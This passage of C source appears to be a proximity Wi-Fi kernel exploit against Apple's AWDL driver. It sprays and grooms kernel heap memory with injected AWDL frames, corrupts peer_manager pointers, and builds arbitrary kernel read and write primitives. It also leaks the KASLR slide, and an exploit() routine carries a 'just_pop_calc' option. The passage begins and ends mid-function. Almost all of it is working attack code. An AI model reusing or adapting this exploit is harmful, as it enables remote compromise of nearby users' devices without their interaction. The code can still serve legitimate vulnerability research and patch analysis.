      // keep this loop going as long as we can while staying inside the 800ms safety window

      // now corrupt upper's peer_manager again so that it points to the real arbitrary_add target:
      *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
      inject(RT(),
         WIFI(aa_para.dst, aa_para.lower_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         HT_CAPS(),
         DATAPATH(aa_para.lower_peer_mac),
         SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
         PKT_END());

      uint8_t current_byte = original[current_byte_offset];
      uint8_t desired_byte = buf[current_byte_offset];
      uint8_t delta_byte = desired_byte - current_byte;
      uint16_t delta_val = delta_byte;

      // this can be 0x69?
      if (delta_val < 0x80) {
        delta_val += 0x100;
      }

      // the target arbitrary_add: 
      do {
       // only continue if <800ms elapsed
       if (now_nanoseconds() - timestamp_start > 600*1000*1000) {
         // abort; need to fixup upper
         printf("aborting arbitrary_write at checkpoint 2 (noread)\n");
         goto abort_and_retry;
       }
       received = try_inject(RT(),
         WIFI(aa_para.dst, aa_para.upper_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         TLV_IGN(delta_val-0x66),
         PKT_END());
      } while(!received);

      // apply the change to original too so the overflow is also visible:
      // (we added 3 to the size of the original buffer to account for this cast)
      *((uint32_t*)(original+current_byte_offset))+=((uint32_t)delta_val);

      current_byte_offset++;

      if (current_byte_offset == len) {
        // we're done:
        // fixup upper's peer_manager field:
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        printf("wkbuf_bundled_noread done??\n");
        // we should read the buffer back and check

        free(original);
        return;
      }
    }

abort_and_retry:
    // don't actually need to do this??
    // fixup upper's peer_manager field:
    memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
    
  }

  // unreachable
  return;
}

#if 0
void overwrite_NULL_ptr_with_u64_via_add(uint64_t kaddr, uint64_t val) {
  uint64_t overflow_val = 0x100;
  for (int i = 0; i < 8; i++) {
    uint64_t val_to_write = (val >> (i*8)) & 0xff;

    if (val_to_write < 0x80) {
      val_to_write += 0x100;
    }

    val -= (val_to_write << (i*8));

    printf("trying arbitrary add: %llx to %llx\n", val_to_write, kaddr+i);

    arbitrary_add(kaddr+i, val_to_write);

    for (int i = 0; i < 3; i++) {
      size_t out_size = 0;
      arbitrary_read(aa_para.dst, kaddr-0x19, &out_size);
    }

    refresh_peers();

    // wait a bit...
    usleep(10000);
  }
}
#endif

// the second dword pointed to by kaddr has to be <= ~800 (it can be 0)
// XXX: this is only really meant to be used by bootstrap_arbitrary_read
uint64_t slow_read_u64(uint64_t kaddr) {
  while (1) {
    size_t out_size = 0;
    //uint8_t* tlv = arbitrary_read(aa_para.dst, kaddr, &out_size);
    uint8_t* tlv = try_early_read(kaddr, &out_size);
    
    if (!tlv || out_size > 0x20) {
      printf("slow_read_u64: tlv: 0x%llx out_size: 0x%llx\n", tlv, out_size);
      free(tlv);
      continue;
    }

    uint64_t result = *(uint64_t*)(tlv+3);
    printf("slow_read_u64: 0x%016llx\n", result);
    free(tlv);
    return result;
  }
}

/*
   build a better arbitrary read primitive
   we'll target the IO80211ServiceRequestDescriptor which will be sent in master indication frames
   this seems to be NULL normally, but if we point it in to one of our peers we can easily write to it
   (eg by pointing it in to the sync tree buffer which we can write)
   first, since we can only write to the pointer byte-by-byte we need to ensure that the pointer won't be read until
   we've finished writing it:

   IO80211AWDLPeerManager::updateBroadcastMI is on the only path for getting the MI template updated, and it has the following check:
 
if ( *((_BYTE *)this + 29488) & 2 ) // 0x7330
  {
    v5 = *((_DWORD *)this + 807);  0xc9c     // num_outstanding
    if ( v5 <= *((_DWORD *)this + 808) ) 0xca0 // initialized to 3
    {
      v8 = a3;
      *((_DWORD *)this + 807) = v5 + 1;
      v4 = 0;
      IO80211AWDLPeerManager::updatePrimaryPayloadMI(this, a4, 0LL, a3);


  so if the field at peer_manager+0xc9c is greater than the field at peer_manager+0xca0, no updates will occur, and the service descriptor
  pointer won't be read.

  we can easily force this using the arbitrary add primitive to stop and restart MI updates:

  to stop:

    arbitrary add a value N to peer_manager+0xc9f (MSB of num_outstanding)
  
   this makes it massive, and will stop updates.

  to restart:

    arbitrary add the value 0x100-N to peer_manager+0xc9f (MSB of num_outstanding)

   this will cause that byte to overflow, setting it back to zero and the overflow bit will have the effect
   of incremented peer_manager+0xca0, setting it to 4. MI updates will resume.

 
 the only two fields used in the service request descriptor are:
   +0x40 : ptr
   +0x54 : len

 so all we need to do is point the service request pointer in to the sync tree buffer of lower (or upper I guess?) such that
 those two offsets are easily writeable and don't overlap with anything else we use.

*/



void bootstrap_arbitrary_read(uint64_t peer_manager,
                              uint64_t service_request_descriptor_kaddr) {
  // at this point we can do restricted kernel reads, and slightly unreliable arbitrary adds
  // probably the slightly unreliable bit could be fixed with better injection and monitoring setup
  // but we can also work around it in another way.
  
  // disable MI template updates
  while(1) {
    // try to add a value which will disable them:
    arbitrary_add(peer_manager+0xc9f, 0x80);
    uint64_t val = slow_read_u64(peer_manager+0xc9c);
    // try to read that back and see if it worked?
    // if not, we need to do more adds

    printf("tried to disable MI template updates, read back: 0x%016llx\n", val);

    if ((val & 0xffffffff) > 0x100) {
      printf("looks like they're disabled\n");
      break;
    }
    printf("didn't manage to disable them, trying again\n");
  }

  // overwrite each byte value for the target pointer, checking after each add that it worked; and if not, fixing it up

  uint64_t current_u64           = 0x0000000000000000;
  uint64_t desired_arbitrary_u64 = service_request_descriptor_kaddr;


  uint64_t kaddr = peer_manager+0x2978;
  uint64_t read_back_kaddr = peer_manager+0x295f;

  for (int i = 0; i < 8; i++) {
    while (1) {
      uint8_t current_byte = (current_u64 >> (i*8)) & 0xff;
      uint8_t desired_byte = (desired_arbitrary_u64 >> (i*8)) & 0xff;

      if (current_byte == desired_byte) {
        printf("byte %d has desired value: %02x\n", i, desired_byte);
        break;
      }

      // what's the delta byte?

      uint8_t delta_byte = desired_byte - current_byte;

      uint16_t delta_val = delta_byte;

      if (delta_val < 0x80) {
        delta_val += 0x100;
      }

      printf("trying arbitrary add: %x to %llx\n", delta_val, kaddr+i);

      arbitrary_add(kaddr+i, delta_val);

      while (1) {
        size_t out_size = 0;
        //uint8_t* tlv = arbitrary_read(aa_para.dst, read_back_kaddr, &out_size);
        uint8_t* tlv = try_early_read(read_back_kaddr, &out_size);
        if (!tlv || out_size != 0x10b) {
          printf("arbitrary_add verification read failed, tlv: %p, out_size: 0x%x\n", tlv, out_size);
          refresh_peers();
          continue;
        }
        printf("old val: 0x%016llx\n", current_u64);
        current_u64 = *(uint64_t*)(tlv+0x1c);
        printf("new val: 0x%016llx\n", current_u64);
        break;
      }

      // XXX: we should really just filter this down to the peer which need to be updated...
      refresh_peers();

      // wait a bit...
      usleep(10000);
    }
  }

  // enable MI template updates
  while(1) {
    // try to add a value which will disable them:
    arbitrary_add(peer_manager+0xc9f, 0x80);
    uint64_t val = slow_read_u64(peer_manager+0xc9c);
    // try to read that back and see if it worked?
    // if not, we need to do more adds

    printf("tried to disable MI template updates, read back: 0x%016llx\n", val);

    if ((val & 0xffffffff) < 0x100) {
      printf("looks like they're disabled\n");
      break;
    }
    printf("didn't manage to disable them, trying again\n");
  }
  
  // peer_manager+0x5950 enables peer bloom filter generation
  // it will also force the regeneration of the MI template each time a new peer arrives
  arbitrary_add(peer_manager+0x5950, 0x7f);


  printf("setup for fast arbitrary read should be done now\n");
}

void bootstrap_arbitrary_read_fast(uint64_t peer_manager,
                              uint64_t service_request_descriptor_kaddr) {
  // at this point we can do restricted kernel reads, and slightly unreliable arbitrary adds
  // probably the slightly unreliable bit could be fixed with better injection and monitoring setup
  // but we can also work around it in another way.
  
  // disable MI template updates
  while(1) {
    // try to add a value which will disable them:
    arbitrary_add(peer_manager+0xc9f, 0x80);
    uint64_t val = slow_read_u64(peer_manager+0xc9c);
    // try to read that back and see if it worked?
    // if not, we need to do more adds

    printf("tried to disable MI template updates, read back: 0x%016llx\n", val);

    if ((val & 0xffffffff) > 0x100) {
      printf("looks like they're disabled\n");
      break;
    }
    printf("didn't manage to disable them, trying again\n");
  }

  // overwrite each byte value for the target pointer, checking after each add that it worked; and if not, fixing it up

  //uint64_t current_u64           = 0x0000000000000000;
  uint64_t current_u64 = 0;
  while (1) {
    size_t out_size = 0;
    uint8_t* tlv = try_early_read(peer_manager+0x295f, &out_size);
    if (!tlv) {
      continue;
    }
    current_u64 = *(uint64_t*)(tlv+0x1c);
    free(tlv);
    break;
  }
  printf("SRD had original value: 0x%016llx\n", current_u64);
  uint64_t desired_arbitrary_u64 = service_request_descriptor_kaddr;


  uint64_t kaddr = peer_manager+0x2978;
  uint64_t read_back_kaddr = peer_manager+0x295f;

  wkbuf_bundled_noread(kaddr, (uint8_t*)&desired_arbitrary_u64, 8, (uint8_t*)&current_u64);
/*
  for (int i = 0; i < 8; i++) {
    while (1) {
      uint8_t current_byte = (current_u64 >> (i*8)) & 0xff;
      uint8_t desired_byte = (desired_arbitrary_u64 >> (i*8)) & 0xff;

      if (current_byte == desired_byte) {
        printf("byte %d has desired value: %02x\n", i, desired_byte);
        break;
      }

      // what's the delta byte?

      uint8_t delta_byte = desired_byte - current_byte;

      uint16_t delta_val = delta_byte;

      if (delta_val < 0x80) {
        delta_val += 0x100;
      }

      printf("trying arbitrary add: %x to %llx\n", delta_val, kaddr+i);

      arbitrary_add(kaddr+i, delta_val);

      while (1) {
        size_t out_size = 0;
        //uint8_t* tlv = arbitrary_read(aa_para.dst, read_back_kaddr, &out_size);
        uint8_t* tlv = try_early_read(read_back_kaddr, &out_size);
        if (!tlv || out_size != 0x10b) {
          printf("arbitrary_add verification read failed, tlv: %p, out_size: 0x%x\n", tlv, out_size);
          refresh_peers();
          continue;
        }
        printf("old val: 0x%016llx\n", current_u64);
        current_u64 = *(uint64_t*)(tlv+0x1c);
        printf("new val: 0x%016llx\n", current_u64);
        break;
      }

      // XXX: we should really just filter this down to the peer which need to be updated...
      refresh_peers();

      // wait a bit...
      usleep(10000);
    }
  }
*/
  refresh_peers();

  // enable MI template updates
  while(1) {
    // try to add a value which will disable them:
    arbitrary_add(peer_manager+0xc9f, 0x80);
    uint64_t val = slow_read_u64(peer_manager+0xc9c);
    // try to read that back and see if it worked?
    // if not, we need to do more adds

    printf("tried to enable MI template updates, read back: 0x%016llx\n", val);

    if ((val & 0xffffffff) < 0x100) {
      printf("looks like they're enabled\n");
      break;
    }
    printf("didn't manage to enable them, trying again\n");
  }
  
  // peer_manager+0x5950 enables peer bloom filter generation
  // it will also force the regeneration of the MI template each time a new peer arrives
  arbitrary_add(peer_manager+0x5950, 0x7f);


  printf("setup for fast arbitrary read should be done now\n");
}

struct fast_arbitrary_read_params {
  uint64_t descriptor_ptr_kaddr; // so we can use the arbitrary read to read a known value
  struct ether_addr dst;
  struct ether_addr lower_peer_mac;
};

struct fast_arbitrary_read_params far_parm = {0};

void init_arbitrary_read_fast(uint64_t descriptor_ptr_kaddr, struct ether_addr dst, struct ether_addr lower_peer_mac) {
  far_parm.descriptor_ptr_kaddr = descriptor_ptr_kaddr;
  far_parm.dst = dst;
  far_parm.lower_peer_mac = lower_peer_mac;
  regen_peer =  *(ether_aton("22:99:22:73:00:00"));
  using_fast_read = 1;
}



void* arbitrary_read_fast(uint64_t target_kaddr, uint32_t target_len) {
  using_fast_read = 1;
  need_leak_buffer_reload = 1;

  struct ether_addr regen_peer =  *(ether_aton("22:99:22:73:00:00"));
restart_read:
  *(((uint16_t*)&regen_peer)+2) = regen_peer_id++;

  struct nsync_payload {
    uint8_t pad_0[5];
    uint64_t ptr;
    uint8_t pad_1[0xc];
    uint32_t len;
  } __attribute__((packed));

  struct nsync_payload np = {0};
  np.ptr = far_parm.descriptor_ptr_kaddr;
  np.len = 8;

  // TODO: there's no reason for this loop
  for (int i = 0; i < 3; i++) {
    inject(RT(),
        WIFI(far_parm.dst, far_parm.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(far_parm.lower_peer_mac),
        NSYNC(&np, sizeof(np)),
        PKT_END());
  }

  *(((uint16_t*)&regen_peer)+2) = regen_peer_id++; 
  inject(RT(),
      WIFI(far_parm.dst, regen_peer),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(regen_peer),
      PKT_END());

  // receive MI frames until we start getting a 0x10 TLV with descriptor_ptr_kaddr as the value:
  struct srd_tlv {
    uint8_t type;
    uint16_t len;
    uint8_t flag;
    uint8_t payload[0];
  }__attribute__((packed));
  int n_fails = 0;
  while(1) {
    struct srd_tlv* srd = try_get_TLV(0x10);
    if (srd && srd->len == 9 && ((*(uint64_t*)(&srd->payload[0])) == far_parm.descriptor_ptr_kaddr)) {
      printf("got sentienel value in SRD; setting up for target read...\n");
      free(srd);
      break;
    }
    free(srd);
    n_fails++;
    if (n_fails > 4) {
      goto restart_read;
    }
  }

  // once we've got that, send the real read target:
  np.ptr = target_kaddr;
  np.len = target_len;

  for (int i = 0; i < 3; i++) {
    inject(RT(),
        WIFI(far_parm.dst, far_parm.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(far_parm.lower_peer_mac),
        NSYNC(&np, sizeof(np)),
        PKT_END());
  }
  
  *(((uint16_t*)&regen_peer)+2) = regen_peer_id++; 
  inject(RT(),
      WIFI(far_parm.dst, regen_peer),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(regen_peer),
      PKT_END());

  // receive in a loop and wait for the value to no longer be the descriptor_ptr_kaddr:
  struct srd_tlv* srd = NULL;
  n_fails = 0;
  while(1) {
    n_fails++;
    if (n_fails > 4) {
      goto restart_read;
    }
    refresh_peers();
    srd = try_get_TLV(0x10);
    if (!srd) {
      printf("didn't get tlv\n");
      continue;
    }
    if (target_len == 8) {
      // check that the value isn't the sentinel (should make this an actual sentinel?)
      uint64_t payload = *(uint64_t*)(&srd->payload[0]);
      if (payload == far_parm.descriptor_ptr_kaddr) {
        printf("payload didn't change\n");
        // unchanged
        free(srd);
        continue;
      }
      printf("payload did change, got it\n");
      // got it!
      break;

    }
    else {
      //if (srd->len != 9) { // no, let's actually check whether the length really matches
      if (srd->len == target_len+1) {
        // sentinel length was different, so this is sufficient
        // got it!
        printf("payload length changed, got it\n");

        break;
      }
      printf("payload length didnt' change, waiting...\n");
    }
  }

  if (srd->len < 1) {
    printf("something not right...\n");
    return NULL;
  }
  void* result = malloc(srd->len - 1);
  memcpy(result, &srd->payload[0], srd->len - 1);
  printf("arbitrary_read_fast result length: %d\n", srd->len - 1);
  hexdump(result, srd->len - 1);
  free(srd);
  return result;
}






// keep the necessary peers alive
int n_refresh_peers = 0;
struct ether_addr faster_refresh_peers[6] = {0};

/*
  rather than 
*/
void init_faster_peer_refresh(struct ether_addr dst,
                              struct ether_addr lower_peer_mac,
                              struct ether_addr upper_peer_mac,
                              uint64_t lower_peer_kaddr,
                              uint64_t upper_peer_kaddr,
                              void* leak)
{
  // TODO: it might make sense to separate out upper peer from this later to
  // speed things up (we want to control upper peer's timestamp)

  faster_refresh_peers[0] = lower_peer_mac;
  faster_refresh_peers[1] = upper_peer_mac;

  n_refresh_peers = 2;

  uint64_t list_peer_kaddrs[4] = {0};

  // may as well use leak here because that will allow us to skip a read
  list_peer_kaddrs[0] = *(uint64_t*)(((uint8_t*)leak)+0x1cb);
  list_peer_kaddrs[1] = *(uint64_t*)(((uint8_t*)leak)+0x1d3);
  
  printf("upper peer LL:\n0x%016llx\n0x%016llx\n", list_peer_kaddrs[0], list_peer_kaddrs[1]);

  refresh_peers();
  uint64_t* lower_LL_entries = arbitrary_read_fast(lower_peer_kaddr+0x10, 0x10);
  list_peer_kaddrs[2] = *lower_LL_entries;
  list_peer_kaddrs[3] = *(lower_LL_entries+1);
  
  printf("lower peer LL:\n0x%016llx\n0x%016llx\n", list_peer_kaddrs[2], list_peer_kaddrs[3]);

  for (int i = 0; i < 4; i++) {
    uint64_t list_peer = list_peer_kaddrs[i];
    printf("list peer: 0x%016llx ", list_peer);

    // have we done this peer already?
    if (list_peer == lower_peer_kaddr ||
        list_peer == upper_peer_kaddr) {
      printf("is already in list (upper or lower)\n");
      continue;
    }

    int already_in_list = 0;
    for (int j = 0; j < i; j++) {
      if (list_peer == list_peer_kaddrs[j]) {
        printf("is already in list (already seen in list)\n");
        already_in_list = 1;
        break;
      }
    }
    if (already_in_list) {
      continue;
    }

    // we haven't already read this peer, get its MAC address and add it to the list
    refresh_peers();
    struct ether_addr* list_peer_mac = arbitrary_read_fast(list_peer+0x20, 6);
    faster_refresh_peers[n_refresh_peers++] = *list_peer_mac;
    printf(" is a new peer for refresh list, mac is: %s\n", ether_ntoa(list_peer_mac));
  
    free(list_peer_mac);
  }

  printf("init_faster_refresh_peers set up optimzed refresh for the following peers:\n");
  for (int i = 0; i < n_refresh_peers; i++) {
    printf("  %s\n", ether_ntoa(&faster_refresh_peers[i]));
  }

}

void* rkbuf(uint64_t kaddr, uint32_t len) {
  uint64_t* buf = arbitrary_read_fast(kaddr, len);
  if (buf == NULL) {
    printf("something didn't work with arbitrary kbuf read for kaddr: 0x%016llx\n", kaddr);
    return NULL;
  }
  return buf;
}

uint64_t rk64(uint64_t kaddr) {
  uint64_t* buf = arbitrary_read_fast(kaddr, 8);
  if (buf == NULL) {
    printf("something didn't work with arbitrary kread 64 for kaddr: 0x%016llx\n", kaddr);
    return 0;
  }
  uint64_t val = *buf;
  free(buf);
  return val;
}

uint32_t rk32(uint64_t kaddr) {
  uint32_t* buf = arbitrary_read_fast(kaddr, 4);
  if (buf == NULL) {
    printf("something didn't work with arbitrary kread 64 for kaddr: 0x%016llx\n", kaddr);
    return 0;
  }
  uint32_t val = *buf;
  free(buf);
  return val;
}

uint8_t rk8(uint64_t kaddr) {
  uint8_t* buf = arbitrary_read_fast(kaddr, 1);
  if (buf == NULL) {
    printf("something didn't work with arbitrary kread 8 for kaddr: 0x%016llx\n", kaddr);
    return 0;
  }
  uint8_t val = *buf;
  free(buf);
  return val;
}

// note that this may corrupt the byte above!!! use accordingly
void wk8(uint64_t kaddr, uint8_t desired_byte) {
  int write_attempts = 0;
  uint8_t current_byte = rk8(kaddr);
  while (1) {
    if (current_byte == desired_byte) {
      printf("byte has desired value: %02x\n", desired_byte);
      break;
    }

    // what's the delta byte?
    uint8_t delta_byte = desired_byte - current_byte;

    uint16_t delta_val = delta_byte;

    if (delta_val < 0x80) {
      delta_val += 0x100;
    }

    printf("trying arbitrary add: %x to %llx\n", delta_val, kaddr);

    arbitrary_add(kaddr, delta_val);
    write_attempts++;

    current_byte = rk8(kaddr);

    // XXX: we should really just filter this down to the peers which need to be updated...
    refresh_peers();
  }
  printf("wk8 wrote: 0x%02x to kaddr: 0x%016llx (took %d attempts)\n", desired_byte, kaddr, write_attempts); 
}

// note that this may corrupt the byte above!!! use accordingly
void wk8_no_retry(uint64_t kaddr, uint8_t desired_byte) {
  uint8_t current_byte = rk8(kaddr);
  if (current_byte == desired_byte) {
    printf("byte has desired value: %02x\n", desired_byte);
    return;
  }

  // what's the delta byte?
  uint8_t delta_byte = desired_byte - current_byte;

  uint16_t delta_val = delta_byte;

  if (delta_val < 0x80) {
    delta_val += 0x100;
  }

  printf("trying arbitrary add: %x to %llx\n", delta_val, kaddr);

  arbitrary_add(kaddr, delta_val);

  current_byte = rk8(kaddr);

  // XXX: we should really just filter this down to the peers which need to be updated...
  refresh_peers();
  printf("wk8 wrote: 0x%02x to kaddr: 0x%016llx\n", desired_byte, kaddr); 
}

/*
void wk64(uint64_t kaddr, uint64_t desired_value) {
  printf("writing 0x%016llx to kaddr: 0x%016llx\n", desired_value, kaddr);
  uint8_t* desired_bytes = (uint8_t*)(&desired_value);
  for (int i = 0; i < 8; i++) {
    wk8(kaddr+i, desired_bytes[i]);
  }
}
*/

// really should fix this properly....
// for now, this hack will do...
void wkbuf(uint64_t kaddr, uint8_t* desired_value, uint32_t len) {
  
  wkbuf_bundled_reliable(kaddr, desired_value, len);

  return;
/*
  printf("writing buffer to kaddr: 0x%016llx\n", kaddr);
  while (len > 16) {
    wkbuf_checked(kaddr+offset, &desired_value[offset], 16);
    len -= 16;
    offset += 16;
  }

*/
  uint32_t offset = 0;
  while (len >= 8) {
    wk64(kaddr+offset, *(uint64_t*)&desired_value[offset]);
    len -= 8;
    offset += 8;
  }
  while (len >= 4) {
    wk32(kaddr+offset, *(uint32_t*)&desired_value[offset]);
    len -= 4;
    offset += 4;
  }
}

void wkbuf_checked(uint64_t kaddr, uint8_t* buf, uint32_t len) {
  int success = 0;
  do {
    success = wkbuf_bundled(kaddr, buf, len);
  } while (!success);
}

void wk64(uint64_t kaddr, uint64_t desired_value) {
  printf("writing 0x%016llx to kaddr: 0x%016llx\n", desired_value, kaddr);
  int success = 0;
  do {
    success = wkbuf_bundled(kaddr, (uint8_t*)&desired_value, 8);
  } while (!success);
}

void wk32(uint64_t kaddr, uint32_t desired_value) {
  printf("writing 0x%08x to kaddr: 0x%016llx\n", desired_value, kaddr);
  int success = 0;
  do {
    success = wkbuf_bundled(kaddr, (uint8_t*)&desired_value, 4);
  } while (!success);
}

void wk16(uint64_t kaddr, uint16_t desired_value) {
  printf("writing 0x%04hx to kaddr: 0x%016llx\n", desired_value, kaddr);
  int success = 0;
  do {
    success = wkbuf_bundled(kaddr, (uint8_t*)&desired_value, 2);
  } while (!success);
}

int spray_loops = 40;
int64_t middle_peers = 128;

void exploit(struct ether_addr dst, int just_pop_calc) {
  // alloc kalloc_before
  struct ether_addr kalloc_map_peer = *(ether_aton("22:22:44:11:00:00"));
  struct ether_addr before_groom_peer = *(ether_aton("22:22:44:44:00:00"));
  struct ether_addr target_groom_peer = *(ether_aton("22:22:44:66:00:00"));
  struct ether_addr after_groom_peer =  *(ether_aton("22:22:44:88:00:00"));


  uint32_t kalloc_id = 0;

  // each loop iteration is 600kb
  // these are the before_kallocs
  for (int i = 0; i < spray_loops; i++) {
    *(((uint16_t*)&before_groom_peer)+2) = i;

    // can't use the REPEAT function because each serv_resp needs a unique ID:
    pkt_buf_t* kallocs = SERV_RESP_16K_ID(kalloc_id++);
    for (int n = 0; n < 39; n++) {
      kallocs = GLUE(kallocs, SERV_RESP_16K_ID(kalloc_id++));
    }

    inject(RT(),
        WIFI(dst, before_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        kallocs,
        HT_CAPS(),
        DATAPATH(dst),
        PKT_END());
  }

  int64_t before_kalloc_limit = (int64_t)kalloc_id;

  // allocate the target peers:

  for (int i = 0; i < middle_peers; i++) {
    *(((uint16_t*)&target_groom_peer)+2) = i;
    struct peer_fake_steering_blob {
      uint32_t msg_id;
      uint32_t msg_len;
      uint32_t magic; // 0x43434343 == peer
      //uint32_t id; // i from this loop
      struct ether_addr mac; // the MAC of this peer
      uint8_t pad[32];
    } __attribute__((packed));

    struct peer_fake_steering_blob fake_steerer = {0};

    fake_steerer.msg_id = 6;
    fake_steerer.msg_len = 0x320;
    fake_steerer.magic = 0x43434343;
    fake_steerer.mac = target_groom_peer;

    inject(RT(),
        WIFI(dst, target_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(target_groom_peer),
        SYNC_TREE((struct ether_addr*)&fake_steerer, sizeof(struct peer_fake_steering_blob)/sizeof(struct ether_addr)),
        PKT_END());

  }

  // allocate the after_kallocs:
  for (int i = 0; i < spray_loops; i++) {
    *(((uint16_t*)&after_groom_peer)+2) = i;

    // can't use the REPEAT function because each serv_resp needs a unique ID:
    pkt_buf_t* kallocs = SERV_RESP_16K_ID(kalloc_id++);
    for (int n = 0; n < 39; n++) {
      kallocs = GLUE(kallocs, SERV_RESP_16K_ID(kalloc_id++));
    }

    inject(RT(),
        WIFI(dst, after_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        kallocs,
        HT_CAPS(),
        DATAPATH(dst),
        PKT_END());
  }

  // fill in gaps in the kalloc_map, this is just for testing...
  for (int i = 0; i < 30; i++) {
    *(((uint16_t*)&kalloc_map_peer)+2) = i;

    inject(RT(),
        WIFI(dst, kalloc_map_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        REPEAT(SERV_RESP_GROOM(59595), 40),
        HT_CAPS(),
        DATAPATH(dst),
        PKT_END());
  }

  printf("filled in kalloc_map..\n");

  // try to read from zone_guess:
  //uint64_t zone_guess = 0xffffffe007475648;
  //uint64_t zone_guess =   0xffffffe008081648;
  //uint64_t zone_guess =   0xffffffe008041648;
  uint64_t zone_guess = 0xffffffe008e3d648;

  uint32_t previous_id = 0x12341234;
  int64_t linear_search_delta = 0x4000;
  
  struct ether_addr lower_peer_mac = *(ether_aton("44:44:44:44:44:44"));
  struct ether_addr upper_peer_mac = *(ether_aton("66:66:66:66:66:66"));
  uint64_t lower_peer_kaddr = 0;
  uint64_t upper_peer_kaddr = 0;
  uint64_t awdl_peer_vtable = 0;
  uint64_t peer_manager     = 0;

  uint64_t kaslr_slide      = 0;

  void* leak;

  init_refresh_peers(dst, middle_peers, upper_peer_mac);
  
  for (int i = 0; i < 100; i++) {
    printf("trying to read: 0x%llx\n", zone_guess);

    struct fake_steerer {
      uint8_t type;
      uint16_t length;
      uint32_t msg_id;
      uint32_t msg_len;
      uint32_t magic;
      uint32_t id;
    } __attribute__((packed));
    size_t out_size = 0;
    //struct fake_steerer* steerer = arbitrary_read(dst, zone_guess, &out_size);
    struct fake_steerer* steerer = try_early_read(zone_guess, &out_size);

    if (out_size >= sizeof(struct fake_steerer)) {
      if (steerer->magic == 0x41414141 && steerer->id != previous_id) {
        printf("got arbitrary steering blob result: for guess 0x%016llx ID is: 0x%x\n", zone_guess, steerer->id);
        previous_id = steerer->id;

        // compute the next binary search target to try to find a peer

        int64_t id = (int64_t)steerer->id;

        int64_t guess_page_delta = 0;
        if (id < before_kalloc_limit) {
          // current guess dropped us below the target range
          guess_page_delta = before_kalloc_limit - id;
          printf("guess_page_delta: 0x%016llx\n", guess_page_delta);
          guess_page_delta += ((middle_peers*0x1800)/0x4000); // this is based on allocating 24 peers in the mid-range
          printf("guess_page_delta: 0x%016llx\n", guess_page_delta);
          linear_search_delta = -0x4000;
        } else {
          // current guess dropped us above the target range
          guess_page_delta = before_kalloc_limit - id;
          printf("guess_page_delta: 0x%016llx\n", guess_page_delta);
          guess_page_delta -= ((middle_peers*0x1800)/0x4000);
          printf("guess_page_delta: 0x%016llx\n", guess_page_delta);
          linear_search_delta = 0x4000;
        }

        // TODO: check if we've guess this before, and if so, move along a bit
        int64_t byte_delta = guess_page_delta*0x4000;
        printf("byte delta: 0x%016llx\n", byte_delta);
        zone_guess += (uint64_t)byte_delta;
        printf("new guess: 0x%016llx\n", zone_guess);
      } else if (steerer->magic == 0x43434343) {
        printf("found peer! current guess: 0x%016llx\n", zone_guess);

        // extract everything we need:
        lower_peer_kaddr = zone_guess - 0x1648;
        upper_peer_kaddr = lower_peer_kaddr + 0x1800;

        memcpy((void*)&lower_peer_mac, &steerer->id, 6);
        memcpy((void*)&upper_peer_mac, ((uint8_t*)steerer)+0x1db, 6);
        memcpy((void*)&awdl_peer_vtable, ((uint8_t*)steerer)+0x1bb, 8);
        memcpy((void*)&peer_manager, ((uint8_t*)steerer)+0x1e3, 8);


#define CLEAR_PAC(val) (val & (~0xffffff8000000000))
        kaslr_slide = CLEAR_PAC(awdl_peer_vtable) - CLEAR_PAC(0xFFFFFFF007A434A0); 
        // make a copy:
        leak = malloc(steerer->length+3);
        memcpy(leak, steerer, steerer->length+3);
        free(steerer);
        break;
      }
    } 
    
    zone_guess += (uint64_t)linear_search_delta; //0x4000;

    free(steerer);
    refresh_peers();
    /*
    printf("refreshing target peers\n");
    for (int k = 0; k < middle_peers; k++) {
      *(((uint16_t*)&target_groom_peer)+2) = k;
      inject(RT(),
          WIFI(dst, target_groom_peer),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(target_groom_peer),
          PKT_END());
    }
    printf("refreshed targets, continuing...\n");
    */
  }

  printf("lower peer: %s kaddr: 0x%016llx\n", ether_ntoa(&lower_peer_mac), lower_peer_kaddr);
  printf("upper peer: %s kaddr: 0x%016llx\n", ether_ntoa(&upper_peer_mac), upper_peer_kaddr);
  printf("peer manager kaddr: 0x%016llx\n", peer_manager);
  printf("IO80211AWDLPeer vtable with PAC: 0x%016llx\n", awdl_peer_vtable);
  printf("kaslr slide: %016llx\n", kaslr_slide); 

  init_refresh_peers(dst, middle_peers, upper_peer_mac);

  // we have a copy of the whole OOB read data in leak

  // refresh the two peers so they don't get freed:
  inject(RT(),
      WIFI(dst, lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
